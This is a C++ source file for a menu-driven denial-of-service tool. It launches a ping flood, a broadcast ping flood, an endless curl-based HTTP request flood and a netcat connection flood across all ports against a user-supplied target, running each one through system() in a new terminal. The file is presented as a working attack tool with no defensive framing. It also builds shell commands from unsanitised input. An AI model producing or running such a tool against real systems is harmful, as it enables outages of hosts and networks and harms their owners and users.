#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

int main() {
    int choice;
    cout << "Select an option:" << endl;
    cout << "1. Ping Flood" << endl;
    cout << "2. HTTP Request Flood" << endl;
    cout << "3. Broadcast Ping Flood" << endl;
    cout << "4. Random Port Connection Flood" << endl;
    cout << "Enter your choice: ";
    cin >> choice;

    switch (choice) {
        case 1: { // Ping Flood
            string targetIP;
            cout << "Enter the target IP address: ";
            cin >> targetIP;

            // Use sudo for ping flood
            string command = "gnome-terminal -- bash -c 'sudo ping -f " + targetIP + "; exec bash'";
            cout << "Starting ping flood on " << targetIP << "..." << endl;
            system(command.c_str());
            break;
        }
        case 2: { // HTTP Request Flood
            string targetURL;
            int requestRate;
            cout << "Enter the target URL (e.g., http://example.com): ";
            cin >> targetURL;
            cout << "Enter the number of requests per second: ";
            cin >> requestRate;

            // Use curl in a loop for HTTP request flood
            string command = "gnome-terminal -- bash -c 'while true; do for i in $(seq 1 " + to_string(requestRate) + "); do curl -s -o /dev/null " + targetURL + " & done; sleep 1; done; exec bash'";
            cout << "Starting HTTP request flood on " << targetURL << " at " << requestRate << " requests per second..." << endl;
            system(command.c_str());
            break;
        }
        case 3: { // Broadcast Ping Flood
            string targetIP;
            cout << "Enter the broadcast IP address for broadcast ping flood (e.g., 192.168.1.255): ";
            cin >> targetIP;

            // Use sudo for broadcast ping flood
            string command = "gnome-terminal -- bash -c 'sudo ping -b " + targetIP + "; exec bash'";
            cout << "Starting broadcast ping flood on broadcast IP: " << targetIP << "..." << endl;
            system(command.c_str());
            break;
        }
        case 4: { // Random Port Connection Flood
            string targetIP;
            cout << "Enter the target IP address: ";
            cin >> targetIP;

            // Use netcat (nc) for random port connection flooding
            string command = "gnome-terminal -- bash -c 'while true; do for port in $(seq 1 65535); do nc -zv -w1 " + targetIP + " $port & done; done; exec bash'";
            cout << "Starting random port connection flood on " << targetIP << "..." << endl;
            system(command.c_str());
            break;
        }
        default:
            cout << "[ERROR] Invalid choice. Exiting program." << endl;
            break;
    }

    return 0;
}
